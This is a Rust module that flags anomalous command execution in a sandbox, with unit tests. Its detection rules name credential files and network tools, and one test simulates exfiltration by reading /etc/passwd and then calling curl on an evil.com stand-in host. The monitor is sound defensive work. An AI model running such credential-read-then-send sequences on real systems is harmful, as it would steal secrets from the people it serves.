//! Behavior anomaly detection for sandboxed command execution.
//!
//! Monitors command execution patterns and flags anomalous behavior
//! that deviates from the session's normal scope. Anomalies include:
//! - Commands targeting unexpected file paths
//! - Sudden spikes in execution frequency
//! - Commands from categories not previously seen
//! - Network access to unexpected domains
//! - High failure rates suggesting probing behavior

use chrono::{DateTime, Utc};
use serde::{Deserialize, Serialize};
use std::collections::HashSet;
use std::path::PathBuf;

/// Severity level for detected anomalies.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum AnomalySeverity {
    /// Informational — slight deviation, likely benign.
    Info,
    /// Warning — notable deviation, may warrant attention.
    Warning,
    /// Critical — significant deviation, likely malicious or mistaken.
    Critical,
}

/// A detected behavior anomaly.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct BehaviorAnomaly {
    /// When the anomaly was detected.
    pub timestamp: DateTime<Utc>,
    /// Type of anomaly detected.
    pub kind: AnomalyKind,
    /// How severe the anomaly is.
    pub severity: AnomalySeverity,
    /// Human-readable description.
    pub description: String,
    /// The command that triggered the anomaly.
    pub command: String,
    /// Suggested action.
    pub recommendation: String,
}

/// Classification of anomaly types.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum AnomalyKind {
    /// Command accesses a path outside the workspace scope.
    PathScopeViolation,
    /// Too many commands in a short time window.
    ExecutionFrequencySpike,
    /// Command belongs to a new category not seen before.
    NewCommandCategory,
    /// Network access to a domain not in the allowed set.
    UnexpectedNetworkAccess,
    /// High rate of command failures (possible probing).
    HighFailureRate,
    /// Command pattern matches known dangerous sequences.
    SuspiciousCommandSequence,
}

/// Command category classification.
#[derive(Debug, Clone, PartialEq, Eq, Hash, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum CommandCategory {
    /// File operations (ls, cat, cp, mv, rm, etc.).
    FileOps,
    /// Network operations (curl, wget, ssh, etc.).
    Network,
    /// Package management (npm, pip, cargo, apt, etc.).
    PackageManagement,
    /// Version control (git, svn, etc.).
    VersionControl,
    /// Build/compile (make, cargo build, npm run, etc.).
    Build,
    /// System administration (systemctl, service, etc.).
    SystemAdmin,
    /// Shell/script execution (bash, sh, python, node, etc.).
    ShellExecution,
    /// Unknown or unclassified.
    Unknown,
}

impl CommandCategory {
    /// Classify a command into a category based on its first token.
    pub fn classify(command: &str) -> Self {
        let first_word = command.split_whitespace().next().unwrap_or("");
        match first_word {
            "ls" | "cat" | "head" | "tail" | "cp" | "mv" | "rm" | "mkdir" | "touch" | "chmod"
            | "chown" | "find" | "grep" | "wc" | "diff" | "sort" | "uniq" | "dir" | "type"
            | "copy" | "move" | "del" | "xcopy" => CommandCategory::FileOps,

            "curl" | "wget" | "ssh" | "scp" | "rsync" | "nc" | "netcat" | "telnet" | "ftp"
            | "dig" | "nslookup" | "ping" | "traceroute" => CommandCategory::Network,

            "npm" | "yarn" | "pnpm" | "pip" | "pip3" | "cargo" | "apt" | "apt-get" | "yum"
            | "dnf" | "brew" | "choco" | "nuget" => CommandCategory::PackageManagement,

            "git" | "svn" | "hg" => CommandCategory::VersionControl,

            "make" | "cmake" | "ninja" | "gradle" | "mvn" | "msbuild" => CommandCategory::Build,

            "systemctl" | "service" | "netsh" | "reg" | "regedit" | "sc" | "taskkill" | "kill"
            | "killall" | "mount" | "umount" | "fdisk" | "mkfs" => CommandCategory::SystemAdmin,

            "bash" | "sh" | "zsh" | "fish" | "python" | "python3" | "node" | "ruby" | "perl"
            | "php" | "java" | "go" | "rustc" | "powershell" | "cmd" => {
                CommandCategory::ShellExecution
            }

            _ => CommandCategory::Unknown,
        }
    }
}

/// Configuration for behavior monitoring.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct BehaviorMonitorConfig {
    /// Maximum commands per minute before triggering frequency anomaly.
    pub max_commands_per_minute: usize,
    /// Maximum failure rate (0.0-1.0) before triggering high-failure-rate anomaly.
    pub max_failure_rate: f64,
    /// Minimum number of commands before failure rate checks activate.
    pub min_commands_for_failure_check: usize,
    /// Paths that are considered within scope.
    pub scope_paths: Vec<PathBuf>,
    /// Domains that are expected/allowed.
    pub allowed_domains: HashSet<String>,
    /// Whether to detect new command categories.
    pub detect_new_categories: bool,
}

impl Default for BehaviorMonitorConfig {
    fn default() -> Self {
        Self {
            max_commands_per_minute: 60,
            max_failure_rate: 0.5,
            min_commands_for_failure_check: 5,
            scope_paths: Vec::new(),
            allowed_domains: HashSet::new(),
            detect_new_categories: true,
        }
    }
}

/// Monitors command execution behavior and detects anomalies.
#[derive(Debug)]
pub struct BehaviorMonitor {
    config: BehaviorMonitorConfig,
    /// Timestamps of recent commands (for frequency tracking).
    recent_timestamps: Vec<DateTime<Utc>>,
    /// Set of command categories seen so far.
    seen_categories: HashSet<CommandCategory>,
    /// Number of failed commands (non-zero exit).
    failure_count: usize,
    /// Total number of commands.
    total_count: usize,
    /// Recent command history for sequence detection.
    command_history: Vec<String>,
    /// Maximum history size.
    max_history: usize,
}

impl BehaviorMonitor {
    /// Create a new behavior monitor with the given configuration.
    pub fn new(config: BehaviorMonitorConfig) -> Self {
        Self {
            config,
            recent_timestamps: Vec::new(),
            seen_categories: HashSet::new(),
            failure_count: 0,
            total_count: 0,
            command_history: Vec::new(),
            max_history: 100,
        }
    }

    /// Create a monitor with default configuration.
    pub fn default_monitor() -> Self {
        Self::new(BehaviorMonitorConfig::default())
    }

    /// Record a command execution and check for anomalies.
    pub fn record_execution(
        &mut self,
        command: &str,
        cwd: Option<&std::path::Path>,
        exit_code: i32,
        network_domains: &[String],
    ) -> Vec<BehaviorAnomaly> {
        let now = Utc::now();
        let mut anomalies = Vec::new();

        self.total_count += 1;
        if exit_code != 0 {
            self.failure_count += 1;
        }

        // Track timestamps
        self.recent_timestamps.push(now);
        self.prune_old_timestamps(&now);

        // Track command history
        self.command_history.push(command.to_string());
        if self.command_history.len() > self.max_history {
            self.command_history.remove(0);
        }

        // 1. Check execution frequency
        if self.recent_timestamps.len() > self.config.max_commands_per_minute {
            anomalies.push(BehaviorAnomaly {
                timestamp: now,
                kind: AnomalyKind::ExecutionFrequencySpike,
                severity: AnomalySeverity::Warning,
                description: format!(
                    "Execution frequency spike: {} commands in the last minute (max: {})",
                    self.recent_timestamps.len(),
                    self.config.max_commands_per_minute
                ),
                command: command.to_string(),
                recommendation:
                    "Consider rate-limiting command execution or investigate automated scripts."
                        .to_string(),
            });
        }

        // 2. Check command category
        let category = CommandCategory::classify(command);
        if self.config.detect_new_categories && !self.seen_categories.contains(&category) {
            if !self.seen_categories.is_empty() {
                // Only flag if we've already seen some categories (skip the very first command)
                anomalies.push(BehaviorAnomaly {
                    timestamp: now,
                    kind: AnomalyKind::NewCommandCategory,
                    severity: AnomalySeverity::Info,
                    description: format!(
                        "New command category detected: {category:?} (command: '{command}')"
                    ),
                    command: command.to_string(),
                    recommendation: "Verify this command type is expected for the current task."
                        .to_string(),
                });
            }
            self.seen_categories.insert(category);
        }

        // 3. Check path scope violation
        if !self.config.scope_paths.is_empty() {
            if let Some(cwd_path) = cwd {
                let in_scope = self
                    .config
                    .scope_paths
                    .iter()
                    .any(|scope| cwd_path.starts_with(scope));
                if !in_scope {
                    anomalies.push(BehaviorAnomaly {
                        timestamp: now,
                        kind: AnomalyKind::PathScopeViolation,
                        severity: AnomalySeverity::Warning,
                        description: format!(
                            "Command executed outside workspace scope: {cwd_path:?}"
                        ),
                        command: command.to_string(),
                        recommendation:
                            "Check if this path access is necessary for the current task."
                                .to_string(),
                    });
                }
            }
        }

        // 4. Check unexpected network access
        for domain in network_domains {
            if !self.config.allowed_domains.is_empty()
                && !self.config.allowed_domains.contains(domain)
            {
                anomalies.push(BehaviorAnomaly {
                    timestamp: now,
                    kind: AnomalyKind::UnexpectedNetworkAccess,
                    severity: AnomalySeverity::Critical,
                    description: format!("Network access to unexpected domain: {domain}"),
                    command: command.to_string(),
                    recommendation: "Block this domain or add it to the allowed list if legitimate.".to_string(),
                });
            }
        }

        // 5. Check high failure rate
        if self.total_count >= self.config.min_commands_for_failure_check {
            let failure_rate = self.failure_count as f64 / self.total_count as f64;
            if failure_rate > self.config.max_failure_rate {
                anomalies.push(BehaviorAnomaly {
                    timestamp: now,
                    kind: AnomalyKind::HighFailureRate,
                    severity: AnomalySeverity::Warning,
                    description: format!(
                        "High failure rate: {:.1}% ({} out of {} commands failed)",
                        failure_rate * 100.0,
                        self.failure_count,
                        self.total_count
                    ),
                    command: command.to_string(),
                    recommendation:
                        "Investigate failing commands — may indicate probing or misconfiguration."
                            .to_string(),
                });
            }
        }

        // 6. Check suspicious command sequences
        if self.detect_suspicious_sequence(command) {
            anomalies.push(BehaviorAnomaly {
                timestamp: now,
                kind: AnomalyKind::SuspiciousCommandSequence,
                severity: AnomalySeverity::Critical,
                description: format!("Suspicious command sequence detected involving: {command}"),
                command: command.to_string(),
                recommendation: "Review recent command history for malicious patterns.".to_string(),
            });
        }

        anomalies
    }

    /// Get the current monitoring statistics.
    pub fn stats(&self) -> BehaviorStats {
        BehaviorStats {
            total_commands: self.total_count,
            failure_count: self.failure_count,
            failure_rate: if self.total_count > 0 {
                self.failure_count as f64 / self.total_count as f64
            } else {
                0.0
            },
            seen_categories: self.seen_categories.len(),
            recent_commands_per_minute: self.recent_timestamps.len(),
        }
    }

    /// Get the command history.
    pub fn history(&self) -> &[String] {
        &self.command_history
    }

    /// Prune timestamps older than 1 minute.
    fn prune_old_timestamps(&mut self, now: &DateTime<Utc>) {
        let cutoff = *now - chrono::Duration::seconds(60);
        self.recent_timestamps.retain(|t| *t > cutoff);
    }

    /// Detect suspicious command sequences.
    fn detect_suspicious_sequence(&self, command: &str) -> bool {
        let cmd_lower = command.to_lowercase();
        let history = &self.command_history;

        // Pattern: credential exfiltration (reading sensitive files then network access)
        let is_network_cmd = cmd_lower.starts_with("curl") || cmd_lower.starts_with("wget");
        let reads_sensitive = cmd_lower.contains("/etc/passwd")
            || cmd_lower.contains("/etc/shadow")
            || cmd_lower.contains(".ssh/")
            || cmd_lower.contains(".env")
            || cmd_lower.contains("id_rsa");

        if is_network_cmd
            && history.iter().rev().take(5).any(|h| {
                let h_lower = h.to_lowercase();
                h_lower.contains("/etc/passwd")
                    || h_lower.contains(".ssh/")
                    || h_lower.contains(".env")
            })
        {
            return true;
        }

        // Pattern: privilege escalation attempts
        if (cmd_lower.contains("sudo") || cmd_lower.contains("su "))
            && history.iter().rev().take(5).any(|h| {
                let h_lower = h.to_lowercase();
                h_lower.contains("whoami") || h_lower.contains("id") || h_lower.contains("uname")
            })
        {
            return true;
        }

        // Pattern: reading sensitive data
        if reads_sensitive && history.len() >= 2 {
            return true;
        }

        false
    }
}

/// Behavior monitoring statistics.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct BehaviorStats {
    /// Total number of commands recorded.
    pub total_commands: usize,
    /// Number of failed commands.
    pub failure_count: usize,
    /// Failure rate (0.0-1.0).
    pub failure_rate: f64,
    /// Number of distinct command categories seen.
    pub seen_categories: usize,
    /// Commands in the last minute.
    pub recent_commands_per_minute: usize,
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn command_category_classification() {
        assert_eq!(
            CommandCategory::classify("ls -la"),
            CommandCategory::FileOps
        );
        assert_eq!(
            CommandCategory::classify("curl https://example.com"),
            CommandCategory::Network
        );
        assert_eq!(
            CommandCategory::classify("npm install"),
            CommandCategory::PackageManagement
        );
        assert_eq!(
            CommandCategory::classify("git status"),
            CommandCategory::VersionControl
        );
        assert_eq!(
            CommandCategory::classify("make build"),
            CommandCategory::Build
        );
        assert_eq!(
            CommandCategory::classify("systemctl start nginx"),
            CommandCategory::SystemAdmin
        );
        assert_eq!(
            CommandCategory::classify("python script.py"),
            CommandCategory::ShellExecution
        );
        assert_eq!(
            CommandCategory::classify("unknown_cmd"),
            CommandCategory::Unknown
        );
    }

    #[test]
    fn new_category_detected() {
        let mut monitor = BehaviorMonitor::default_monitor();

        // First command — no anomaly (baseline)
        let anomalies = monitor.record_execution("ls", None, 0, &[]);
        assert!(anomalies.is_empty());

        // Different category — anomaly
        let anomalies = monitor.record_execution("curl https://example.com", None, 0, &[]);
        assert!(anomalies
            .iter()
            .any(|a| a.kind == AnomalyKind::NewCommandCategory));
    }

    #[test]
    fn unexpected_network_access_detected() {
        let config = BehaviorMonitorConfig {
            allowed_domains: vec!["api.example.com".to_string()].into_iter().collect(),
            ..Default::default()
        };

        let mut monitor = BehaviorMonitor::new(config);
        let anomalies =
            monitor.record_execution("curl https://evil.com", None, 0, &["evil.com".to_string()]);

        assert!(anomalies
            .iter()
            .any(|a| a.kind == AnomalyKind::UnexpectedNetworkAccess));
    }

    #[test]
    fn allowed_domain_no_anomaly() {
        let config = BehaviorMonitorConfig {
            allowed_domains: vec!["api.example.com".to_string()].into_iter().collect(),
            ..Default::default()
        };

        let mut monitor = BehaviorMonitor::new(config);
        let anomalies = monitor.record_execution(
            "curl https://api.example.com",
            None,
            0,
            &["api.example.com".to_string()],
        );

        assert!(!anomalies
            .iter()
            .any(|a| a.kind == AnomalyKind::UnexpectedNetworkAccess));
    }

    #[test]
    fn path_scope_violation_detected() {
        let config = BehaviorMonitorConfig {
            scope_paths: vec![PathBuf::from("/workspace")],
            ..Default::default()
        };

        let mut monitor = BehaviorMonitor::new(config);
        let anomalies = monitor.record_execution("ls", Some(std::path::Path::new("/etc")), 0, &[]);

        assert!(anomalies
            .iter()
            .any(|a| a.kind == AnomalyKind::PathScopeViolation));
    }

    #[test]
    fn path_in_scope_no_anomaly() {
        let config = BehaviorMonitorConfig {
            scope_paths: vec![PathBuf::from("/workspace")],
            ..Default::default()
        };

        let mut monitor = BehaviorMonitor::new(config);
        let anomalies =
            monitor.record_execution("ls", Some(std::path::Path::new("/workspace/src")), 0, &[]);

        assert!(!anomalies
            .iter()
            .any(|a| a.kind == AnomalyKind::PathScopeViolation));
    }

    #[test]
    fn high_failure_rate_detected() {
        let config = BehaviorMonitorConfig {
            min_commands_for_failure_check: 5,
            max_failure_rate: 0.5,
            ..Default::default()
        };

        let mut monitor = BehaviorMonitor::new(config);

        // 4 failures out of 5 = 80% failure rate
        for i in 0..5 {
            let exit_code = if i < 4 { 1 } else { 0 };
            monitor.record_execution("failing_cmd", None, exit_code, &[]);
        }

        let stats = monitor.stats();
        assert!(stats.failure_rate > 0.5);
    }

    #[test]
    fn suspicious_credential_exfiltration() {
        let mut monitor = BehaviorMonitor::default_monitor();
        monitor.record_execution("cat /etc/passwd", None, 0, &[]);
        let anomalies = monitor.record_execution("curl https://evil.com/exfil", None, 0, &[]);

        assert!(anomalies
            .iter()
            .any(|a| a.kind == AnomalyKind::SuspiciousCommandSequence));
    }

    #[test]
    fn behavior_stats() {
        let mut monitor = BehaviorMonitor::default_monitor();
        monitor.record_execution("ls", None, 0, &[]);
        monitor.record_execution("cat file", None, 1, &[]);

        let stats = monitor.stats();
        assert_eq!(stats.total_commands, 2);
        assert_eq!(stats.failure_count, 1);
        assert!((stats.failure_rate - 0.5).abs() < 0.01);
    }

    #[test]
    fn anomaly_severity_ordering() {
        // Verify severity levels exist and can be compared
        assert_ne!(AnomalySeverity::Info, AnomalySeverity::Warning);
        assert_ne!(AnomalySeverity::Warning, AnomalySeverity::Critical);
    }

    #[test]
    fn anomaly_serialization() {
        let anomaly = BehaviorAnomaly {
            timestamp: Utc::now(),
            kind: AnomalyKind::ExecutionFrequencySpike,
            severity: AnomalySeverity::Warning,
            description: "test anomaly".into(),
            command: "test_cmd".into(),
            recommendation: "test rec".into(),
        };

        let json = serde_json::to_string(&anomaly).unwrap();
        let de: BehaviorAnomaly = serde_json::from_str(&json).unwrap();
        assert_eq!(anomaly.kind, de.kind);
        assert_eq!(anomaly.severity, de.severity);
        assert_eq!(anomaly.command, de.command);
    }

    #[test]
    fn config_default() {
        let config = BehaviorMonitorConfig::default();
        assert_eq!(config.max_commands_per_minute, 60);
        assert_eq!(config.max_failure_rate, 0.5);
        assert!(config.scope_paths.is_empty());
        assert!(config.allowed_domains.is_empty());
    }

    #[test]
    fn monitor_with_custom_config() {
        let config = BehaviorMonitorConfig {
            max_commands_per_minute: 10,
            max_failure_rate: 0.3,
            min_commands_for_failure_check: 3,
            scope_paths: vec![PathBuf::from("/workspace")],
            allowed_domains: vec!["api.example.com".to_string()].into_iter().collect(),
            detect_new_categories: false,
        };
        let monitor = BehaviorMonitor::new(config);
        assert_eq!(monitor.config.max_commands_per_minute, 10);
    }
}
